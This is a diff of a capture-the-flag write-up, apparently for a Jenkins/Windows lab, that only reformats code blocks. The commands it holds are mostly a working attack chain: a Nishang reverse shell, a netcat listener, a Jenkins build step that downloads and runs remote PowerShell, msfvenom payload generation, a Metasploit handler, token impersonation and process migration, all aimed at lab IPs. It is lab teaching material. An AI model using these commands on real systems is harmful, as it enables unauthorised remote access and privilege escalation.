@@ -8,11 +8,15 @@ wget [https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke
 
 Edit the file and add the following to the end of the file. This is just to make it a bit easier when we use it later.
 
-`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.135.134 -Port 4444`
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.135.134 -Port 4444
+```
 
 **How many ports are open? (TCP only)**
 
+```
 nmap -A 10.10.98.134
+```
 
 **What is the username and password for the log in panel(in the format username:password)**
 
@@ -24,7 +28,9 @@ admin:admin
 
 **Kali**
 
-`rlwrap nc -lvnp 4444`
+```
+rlwrap nc -lvnp 4444
+```
 
 **Jenkins**
 
@@ -34,7 +40,10 @@ admin:admin
 
 Under Build add a build step and select 'Execute Windows batch command' then  add the following in the command field
 
-`powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.135.134:81/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp`
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.135.134:81/Invoke-PowerShellTcp.ps1'); 
+Invoke-PowerShellTcp
+```
 
 <figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
@@ -50,29 +59,28 @@ Under Build add a build step and select 'Execute Windows batch command' then  ad
 
 **Kali**&#x20;
 
-`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.135.134 LPORT=1337 -f exe -o shell.exe`
-
-`python2 -m SimpleHTTPServer 81`
+```
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.135.134 LPORT=1337 -f exe -o shell.exe
+python2 -m SimpleHTTPServer 81
+```
 
 **Kali**&#x20;
 
-`msfconsole`
-
-`use exploit/multi/handler`&#x20;
-
-`set PAYLOAD windows/meterpreter/reverse_tcp`&#x20;
-
-`set LHOST 10.10.135.134`&#x20;
-
-`set LPORT 1337`&#x20;
-
-`run`
+```
+msfconsole
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 10.10.135.134 
+set LPORT 1337 
+run
+```
 
 **Victim**&#x20;
 
-`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.8.234:81/shells.exe','shells.exe')"`
-
-`Start-Process "shell.exe"`
+```
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.8.234:81/shells.exe','shells.exe')"
+Start-Process "shell.exe"
+```
 
 <figure><img src="../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -80,15 +88,17 @@ Under Build add a build step and select 'Execute Windows batch command' then  ad
 
 **Victim (Metasploit)**&#x20;
 
-`load incognito`&#x20;
-
-`list_tokens -g`
+```
+load incognito 
+list_tokens -g
+```
 
 ![](<../../.gitbook/assets/image (17).png>)
 
-`impersonate_token "BUILTIN\Administrators"`&#x20;
-
-`getuid`
+```
+impersonate_token "BUILTIN\Administrators" 
+getuid
+```
 
 We are now NT Authority&#x20;
 
@@ -96,9 +106,10 @@ We are now NT Authority&#x20;
 
 Migrating processes to make sure we have correct permissions for the privileged user. The safest process to pick is the services.exe process
 
-`ps`
-
-`migrate 668`
+```
+ps
+migrate 668
+```
 
 <figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>
 
